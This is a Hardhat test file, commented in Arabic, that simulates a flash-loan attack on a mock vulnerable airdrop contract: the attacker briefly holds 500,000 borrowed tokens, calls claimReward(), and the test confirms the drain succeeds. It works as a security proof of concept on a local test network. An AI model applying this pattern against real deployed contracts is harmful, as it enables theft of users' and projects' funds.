const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("محاكاة هجوم القرض الوميضي على التوزيعات", function () {
  it("يجب أن ينجح المهاجم في سحب المكافآت بدون شراء أي توكن", async function () {
    const [owner, victim, attacker] = await ethers.getSigners();

    // 1. نشر عقد العملة الوهمية
    const Token = await ethers.getContractFactory("ERC20Mock");
    const token = await Token.deploy("Test Token", "TST", owner.address, ethers.parseEther("20000000")); // 20 مليون كرصيد إجمالي
    await token.waitForDeployment();
    
    // 2. نشر عقد التوزيعات (الهدف)
    const Airdrop = await ethers.getContractFactory("VulnerableAirdrop");
    const airdrop = await Airdrop.deploy(await token.getAddress());
    await airdrop.waitForDeployment();

    // 3. إعطاء عقد التوزيعات كمية وفيرة من التوكنات ليقوم بالتوزيع (10 ملايين)
    await token.transfer(await airdrop.getAddress(), ethers.parseEther("10000000"));

    console.log("💰 رصيد عقد التوزيعات قبل الهجوم:", ethers.formatEther(await token.balanceOf(await airdrop.getAddress())), "توكن");

    // 4. بدء الهجوم (محاكاة القرض الوميضي)
    console.log("👤 رصيد المهاجم قبل الهجوم:", ethers.formatEther(await token.balanceOf(attacker.address)), "توكن");

    // أ) القرض الوميضي (نعطي المهاجم 500 ألف توكن مؤقتاً)
    await token.transfer(attacker.address, ethers.parseEther("500000"));
    console.log("🏦 المهاجم حصل على قرض وميضي بقيمة 500,000 توكن.");

    // ب) المطالبة بالمكافأة (الثغرة هنا)
    console.log("⚔️ المهاجم يطالب بالمكافأة...");
    await airdrop.connect(attacker).claimReward();

    // ج) التحقق من النتيجة
    const attackerFinalBalance = await token.balanceOf(attacker.address);
    const airdropFinalBalance = await token.balanceOf(await airdrop.getAddress());
    
    console.log("👤 رصيد المهاجم بعد الهجوم:", ethers.formatEther(attackerFinalBalance), "توكن");
    console.log("💰 رصيد عقد التوزيعات بعد الهجوم:", ethers.formatEther(airdropFinalBalance), "توكن");

    // التأكد من أن المهاجم سحب مكافأة ضخمة
    expect(attackerFinalBalance).to.be.greaterThan(0);
    console.log("🚨 تم الاستغلال بنجاح! المهاجم حصل على مكافأة بناءً على رصيده المؤقت.");
  });
});